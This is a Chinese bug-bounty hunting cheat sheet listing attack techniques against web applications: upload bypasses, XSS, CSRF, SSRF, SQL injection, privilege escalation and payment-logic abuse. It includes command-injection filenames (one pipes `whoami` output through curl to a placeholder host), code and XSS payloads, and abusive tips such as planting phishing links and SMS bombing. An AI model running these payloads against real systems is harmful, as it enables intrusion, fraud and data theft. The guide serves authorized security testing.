挖掘思路
========================================

SRC主流漏洞
---------------------------------------
+ 业务逻辑
+ XSS
+ 越权
+ 信息泄露
+ SSRF
+ sql
+ 其它

开放重定位漏洞
----------------------------------------
+ 类型
    - url参数：如 ``login?next=http://example.com``
    - referer参数
+ 场景： 登录，注册，注销等
+ 挖掘方法
    - google语法： ``inurl:%3Dhttp site:example.com``
    - google语法： ``inurl:%3D%2F site:example.com``
+ 绕过技巧
    - 可利用不同浏览器的特性，构造一些非常规的url，具体方法再研究。

文件上传漏洞
----------------------------------------
+ FUZZ上传参数
    - 对upload.php空白界面FUZZ参数名，爆破参数值，出现上传表单后上传shell。
+ 绕过文件类型检测
    - 修改type、fileType、breach等参数为0、1、2或all，绕过文件类型检测，上传成功。
+ IE上传绕过
    - 用IE打开上传点，上传马子，通过filename="1.asp";filename="1.jpg"绕过检测。
+ RCE思路-重命名
    - 原理：文件上传到服务器后，后台有task在轮询目录进行文件移动move，使用反撇号的优先级``执行任意命令
    - 场景：
    - 触发
        ::

            上传文件的"filename"参数改为 `sleep 5`
            或如1.jpg|ping xxxx.xxx.xx
            或如1.jpg;curl`whoami`.xxx.xx
            注：漏洞触发前提可能是文件名需要自己传入的而不是服务器给的随机文件名。
+ RCE思路-数组可控
    - 原理：后端将文件名以数组的方式进行控制
    - payload: ``siteName=11111').phpinfo();//``
+ RCE思路-播放音乐
    - 原理：GET .mp3文件，一般返回文件内容，但是返回其它信息，说明是一个接口，测试命令拼接。
    - payload： ``1.wav|ping `whoami`.xxx.xx``

XSS
----------------------------------------
+ WAF绕过
    - 输出在JS内的闭合与注释；使用Function()代替eval()；atob解密base64加密的JS，绕过对alert()的过滤；反引号代替括号与引号，绕过对()的过滤。
+ 存储型XSS与换绑验证码组合
    - 通过存储型XSS与换绑的验证码输出在前端的组合，实现任意账户无感换绑。
+ 文件上传型
    - pdf 文件上传XSS:需要google浏览器
    - svg文件上传XSS
    - html文件上传XSS
    - swf文件上传XSS
    - xml文件上传XSS
    - 上传图片
        ::

            如果上传数据是：data:image/png;base64,PGltZyBzcmM9MSBvbmVycm9yPWFsZXJ0KDEpPg==
            可以修改为：data:text/html;base64,PGltZyBzcmM9MSBvbmVycm9yPWFsZXJ0KDEpPg==
+ 常见场景
    - 在线客服
    - 个人资料修改
    - 评论区
    - 文本编辑器（所有功能）
+ 技巧
    - 无法弹框的情况下，插入img:  ``<img src=""/>`` ,src加入黄色网站，赌博网站，钓鱼网站等
    - 编码绕过
        ::
            
            %3Cscript%3Ealert(1)%3C/script%3E
            %253Cscript%253Ealert(1)%253C/script%253E
            &#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
            &#x253C;script&#x253E;alert(1)&#x253C;/script&#x3E;
            \u003Cscript\u003Ealert(1)\u003C/script\u003E
            %26%2360;/u%26%2362;
+ 命令
    - ``echo https://www.example.com/ | gau | gf xss| uro | gxss | kxss | tee xss_output.txt``
    - ``python loxs.py``

CSRF
----------------------------------------
+ 常见CSRF点
    - 修改头像、修改密码、修改邮箱、修改手机号、修改支付密码、添加收货地址、删除收货地址、添加银行卡、删除银行卡、发起转账、发起支付、发起提现等。
+ 修改图像
    - 通过修改图像的URL地址为恶意的CSRF地址，从而实现蠕虫式传播。
    - 有同源策略：调用站内功能，如注销，修改密码等。
    - 无同源策略：cookie外带等。
+ 账号绑定
    - 通过账号绑定功能（GET请求直接发送URL/POST请求可以生成以html网页），将绑定URL发送给受害者，当受害者点击后就将自己的SSO账号（如微信，百度等）绑定到了受害者账号。
+ json格式跨域的两种情况
    - 没有严格校验Content-Type头：application/json，导致CSRF攻击。
    - 存在cors配置不当：允许任意域名访问，导致CSRF攻击。
+ postMessage
    - 判断页面是否接受消息
        + 发送消息到当前页面
            ::
                
                window.postMessage('Hello from test', '*');
        + 发送消息到iframe中的页面
            ::

                var iframe = document.querySelector('iframe');
                iframe.contentWindow.postMessage('Hello from test', '*');
                检查iframe的sandbox 属性，如果 iframe 元素包含 sandbox 属性，并且没有 allow-scripts 或 allow-same-origin，则它会限制跨域 postMessage 的功能。

        + 源码查看
            - 检查源代码查看 ``postMessage`` 调用
        + 如果 Access-Control-Allow-Origin 头的值是 * 或者包含了你的来源，则说明目标页面可能支持跨域通信。
    - 测试跨域通信
        + 打开 www.example1.com 页面，控制台输入
            ::

                var iframe = document.createElement('iframe');
                iframe.src = 'https://www.example2.com';
                document.body.appendChild(iframe);
                iframe.onload = function() {
                iframe.contentWindow.postMessage('Hello from example1', 'https://www.example2.com');
                };
        + 在 www.example2.com 页面中，添加监听 postMessage 的代码
            ::

                window.addEventListener('message', function(event) {
                if (event.origin === 'https://www.example1.com') {
                    console.log('Received message from example1:', event.data);
                }
                }, false);
        + 如果 www.example2.com 页面正确接收了消息并在控制台打印了消息，则说明 postMessage 允许跨域通信。




模版注入
----------------------------------------
+ payload: ``${7*7}, {{7*7}}, <%= 7*7 %>``
+ 注入点： ``User-Agent、Referer、表单数据、URL参数、JSON请求体等``

SSRF漏洞
----------------------------------------
+ 关于盲SSRF
    - 通常通过响应时间，状态代码等进行漏洞测试。
+ FUZZ目录与参数名
    - 通过FUZZ目录、参数名得到/xxx?image_url=xx，直接无脑get一个SSRF漏洞。
+ 修改imageurl参数
    - 将imageurl参数修改为dnslog地址，探测内网或云服务器元数据。
+ 文件格式转换
    - 如转PDF，文件导出等。
+ 文件导出
    - 开发票，导出pdf，图片合成，图片上增加文字等。
    - 如htmltopdf之类的。
+ 邮件会议
    - 邮件内容可能会解析为html，包含内网链接等。

寻找SQL注入点
----------------------------------------
+ 除法可用： ``?id=2/1``
+ 找到可执行的函数或方法
    - ``?id=4/if(2=2,2,1)`` 即 ``?id=2``
    - ``?id=4/if(length(user)=1,1,0)`` ：length方法可用
    - ``?id=4/if(left('123',1)=1,1,0)`` :left方法可用
    - ``?id=4/if(left(user,1)='a',1,1)`` :证明user可以用
    - ``?id=1+and+sleep(10)`` :证明sleep函数可用
+ 其它
    - 一般java的网站sql注入会多一点

越权
----------------------------------------
+ **水平越权** :删除openid参数获取所有用户信息，用得到的账号用户名进行喷洒，成功登录。
+ **管理员token获取** :修改username参数为admin，返回管理员token，复用此凭证访问敏感接口。
+ **弱cookie问题** :修改cookie的UserCode值为admin，直接获得管理员权限，尝试SQL注入成功。
+ **修改POST参数** ：修改POST参数username为admin获得管理员权限，重置管理员密码。

并发
----------------------------------------
+ 金融交易类
    - 转账、支付、充值
    - 兑换（积分、货币）
    - 领取优惠券、红包
+ 商品交易类
    - 限量商品购买、秒杀
    - 库存扣减
+ 账户与权限类
    - 用户注册（重复用户名检查）
    - 密码重置（使用一次性Token）
    - 邮箱/手机号绑定（验证码爆破或重复使用）
    - 权限提升（同时发起普通用户和管理员请求）
+ 业务流程类
    - 投票、抽奖（多次抽奖）
    - 任务完成奖励（重复领取）
    - 文件上传（覆盖同名文件）
+ 短信轰炸
    - 对于提示短时间发送太多的话，可以使用并发进行测试

注册登录类漏洞
----------------------------------------

注册
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ **MySQL数据截断** ：insert into数据长度溢出时截断数据，导致注册时的任意用户覆盖。
+ **账号激活链接未加密** ：通过构造激活链接实现任意用户注册。
+ **第三方登录** ：修改第三方登录返回包中的uid，实现任意用户登录。
+ **存在缺陷的二级校验** ：如短信验证码、邮箱验证码等二级校验存在缺陷（提交注册和验证是分开的流程，可以绕开验证），导致任意用户注册。
+ **越权** ：添加 ``&userlevel=1`` ``&userrank=1`` ``&usertype=1`` 等参数实现越权注册。

验证码
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ **验证码未绑定** ：只校验验证码是否有效，导致任意用户登录。
+ **验证码绕过** ：NULL，true或者直接置空。
+ **验证码回显在set-cookie中** ：通过set-cookie中的验证码回显绕过验证。
+ **万能、默认验证码** ：使用万能或默认验证码绕过验证。
+ **验证码4-5位可爆破** ：通过爆破4-5位验证码绕过验证。
+ **验证码未失效即重复使用** : 60s、5分钟等规定时间内没有失效（也可以提交漏洞）。
+ **验证码DOS漏洞**：用户可控图片的大小如长宽，相关工具 capchados

密码重置
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ **任意用户密码重置** :登录接口遍历手机号，密码重置时将手机号替换为其他手机号，成功重置密码。
+ **邮箱密码重置链接凭证不绑定账号** ：通过修改账号ID实现任意用户密码重置。
+ **前端校验关键数据** ：前端校验关键数据（如手机号）导致任意换绑，实现任意用户密码重置。
+ 原始密码表单数据删除。
+ 原始密码字段置为 null 或空字符串。
+ 修改返回包。
+ 注意：企业SRC不要重置他人密码。

支付类漏洞
----------------------------------------
+ **订单信息泄露** :输入手机号获取对应订单信息，滞空手机号返回所有用户信息。
+ **优惠券多次复用** ：尝试多次复用优惠券。
+ **购买售罄商品** ：尝试购买售罄的商品。
+ **参数遍历** ：通过参数遍历寻找隐藏商品、赠品、附属商品，实现0元购。
+ **四舍五入数据处理不当** ：导致支付逻辑漏洞或越权逻辑漏洞。
+ 订单状态
    - 购买的商品没有时间限制，无线囤货，导致库存不足，他人无法购买。
+ 支付状态
    - 订单存在新人价或者初次购买的优惠券
    - 卡支付状态，20分钟订单结束，最后5秒钟（比如19:55）点击付款，生成二维码（卡它不失效），或者比如微信停留在支付状态，先不要支付。
    - 一般20分钟过了之后，这个订单会退回，优惠券也会退回。
    - 再以优惠价下一个同样的物品订单，然后尝试支付第一个订单，如果支付成功，存在漏洞。
    - 注：这个方式可能会亏钱，付款了，没有订单，也不能退款。
+ 其它技巧
    - 添加补贴参数：如 ``shippingCharge``, ``poiCharge``, ``agentCharge``, ``mtCharge``, ``brandCharge``` 等。

客服系统
----------------------------------------
+ xss漏洞：通过客服系统发送xss链接，管理员点击后获取管理员权限。
+ 越权查看别人的聊天记录：通过修改参数获取其他用户的聊天记录。
+ 文件上传漏洞：通过客服系统上传恶意文件，获取服务器权限。

内嵌游戏
----------------------------------------
+ 场景：app，小程序，web里面内嵌的小游戏，可能是第三方开发的，但是通过玩游戏能获取积分，经验值，排名等奖励。

转盘抽奖
----------------------------------------
+ 并发
+ 替换抽取的商品

答题闯关
----------------------------------------
+ 跳关
+ 泄露答案
+ 泄露题库
+ 注：漏洞收取的关键比如积分，排名，经验值，奖励等。

在线社区
----------------------------------------
+ 信息泄露
+ 溯源匿名用户
+ 发布内容，编辑器，打XSS

门户网站
----------------------------------------
+ 敏感信息泄露
+ 接口未授权：路径爆破

注销账号
----------------------------------------
+ 新用户优惠券重复领取
+ 首次优惠重复使用
+ 新用户免费体验7天等

其它逻辑漏洞
----------------------------------------
+ **未授权接口寻找** ：通过FUZZ、405改请求方法、5xx错误寻找未授权接口。
+ **403 Bypass** ：通过FUZZ爆破次级目录或403 Bypass绕过限制。
+ **虚假锁定** ：账号锁定后，通过输入正确密码是否可登录判断。
+ **输入校验过滤不严** ：导致二次注入、二次XSS。
+ **DDOS攻击** ：通过修改查询范围，拉满处理能力，达到拒绝服务效果。
+ **前端数据截图伪造** ：通过前端数据截图伪造与水平越权数据泄露的组合，实现退款欺骗。
+ **自动填充手机号等**: 页面自动填充手机号，可能是通过cookie中的id进行自动查询获取的。

如何嫖洞
----------------------------------------
+ 越权
    - 一个网站一个功能存在越权，说明这个网站的权限设计就有问题，继续找其他功能点的越权。
+ SQL注入
    - 不同的注入点，不同的参数
    - 不同的url和路径
+ XSS
    - 不同的框，分开提交
+ 小程序，h5，web端
    - 小程序的url放在web访问
    - test.abc.com => h5.test.abc.com
    - 其它子域名：如在hunter上搜索 相关标题

